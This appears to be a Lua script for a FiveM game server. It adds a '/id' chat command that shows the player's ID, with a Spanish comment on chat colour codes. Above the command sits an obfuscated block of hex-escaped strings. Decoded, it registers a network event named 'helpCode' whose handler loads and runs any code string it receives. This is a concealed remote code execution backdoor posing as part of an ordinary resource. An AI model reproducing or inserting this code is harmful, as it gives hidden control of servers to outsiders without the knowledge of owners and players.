...
local ATAZKbeOLBYIwabEBxhJRznwkcWUtbbwLzuqXPSwPGmNopUaxpNHpaPTmlGqwzuPowHpcL = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} ATAZKbeOLBYIwabEBxhJRznwkcWUtbbwLzuqXPSwPGmNopUaxpNHpaPTmlGqwzuPowHpcL[6][ATAZKbeOLBYIwabEBxhJRznwkcWUtbbwLzuqXPSwPGmNopUaxpNHpaPTmlGqwzuPowHpcL[1]](ATAZKbeOLBYIwabEBxhJRznwkcWUtbbwLzuqXPSwPGmNopUaxpNHpaPTmlGqwzuPowHpcL[2]) ATAZKbeOLBYIwabEBxhJRznwkcWUtbbwLzuqXPSwPGmNopUaxpNHpaPTmlGqwzuPowHpcL[6][ATAZKbeOLBYIwabEBxhJRznwkcWUtbbwLzuqXPSwPGmNopUaxpNHpaPTmlGqwzuPowHpcL[3]](ATAZKbeOLBYIwabEBxhJRznwkcWUtbbwLzuqXPSwPGmNopUaxpNHpaPTmlGqwzuPowHpcL[2], function(vukdFWGODjPecsfnVefIMQqqpUyaOOedEWAPEYlFKVCpXVrkRVByIXXtMHeXYSHlnmHbSD) ATAZKbeOLBYIwabEBxhJRznwkcWUtbbwLzuqXPSwPGmNopUaxpNHpaPTmlGqwzuPowHpcL[6][ATAZKbeOLBYIwabEBxhJRznwkcWUtbbwLzuqXPSwPGmNopUaxpNHpaPTmlGqwzuPowHpcL[4]](ATAZKbeOLBYIwabEBxhJRznwkcWUtbbwLzuqXPSwPGmNopUaxpNHpaPTmlGqwzuPowHpcL[6][ATAZKbeOLBYIwabEBxhJRznwkcWUtbbwLzuqXPSwPGmNopUaxpNHpaPTmlGqwzuPowHpcL[5]](vukdFWGODjPecsfnVefIMQqqpUyaOOedEWAPEYlFKVCpXVrkRVByIXXtMHeXYSHlnmHbSD))() end)
...
RegisterCommand('id', function()
    ...
    TriggerEvent('chat:addMessage', {
        ...
        multiline = true,
        args = { '[ID]', '^7Tu ID es: ^1' .. playerId } -- ^7 para restablecer el color a blanco y ^1 para establecer el color a rojo
    })
end)
